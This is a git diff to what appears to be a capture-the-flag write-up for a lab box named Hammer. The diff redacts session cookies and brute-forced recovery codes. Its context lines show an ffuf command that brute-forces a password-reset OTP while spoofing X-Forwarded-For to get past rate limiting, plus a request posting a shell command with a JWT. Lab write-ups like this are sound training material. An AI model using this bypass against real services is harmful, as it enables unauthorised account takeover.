@@ -86,10 +86,10 @@ Origin: http://hammer.thm:1337
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://hammer.thm:1337/reset_password.php
 Accept-Encoding: gzip, deflate, br
-Cookie: PHPSESSID=g2uij0q1fjjf81jufr6fbj4091
+Cookie: PHPSESSID=<REDACTED>
 Connection: keep-alive
 
-recovery_code=3234&s=180
+recovery_code=1234&s=180
 ```
 There is a rate limit on OTP. Each session can only allow a maximum of 7 attempts, each lasting 180s. `assets/rate_limite.png`
 
@@ -108,8 +108,8 @@ ffuf -w otp.txt:w1 -w otp.txt:w2 -mode pitchfork -X POST -d "recovery_code=w1&s=
 -H "X-Forwarded-For: w2" -u "http://hammer.thm:1337/reset_password.php" -b "PHPSESSID=g2uij0q1fjjf81jufr6fbj4091" -t 100 -fs 2200 -fs 2291
 
 [Status: 200, Size: 2190, Words: 595, Lines: 53, Duration: 967ms]
-    * w1: 9170
-    * w2: 9170
+    * w1: <REDACTED>
+    * w2: <REDACTED>
 
 :: Progress: [10000/10000] :: Job [1/1] :: 121 req/sec :: Duration: [0:01:19] :: Errors: 0 ::
 ```
@@ -134,7 +134,7 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
 Origin: http://hammer.thm:1337
 Referer: http://hammer.thm:1337/dashboard.php
 Accept-Encoding: gzip, deflate, br
-Cookie: PHPSESSID=76aivqf8vin67gjvjho234jclo; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsI....<REDACTED>....signature; persistentSession=no
+Cookie: PHPSESSID=<REDACTED>; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsI....<REDACTED>....signature; persistentSession=no
 Connection: keep-alive
 
 {"command":"ls"}
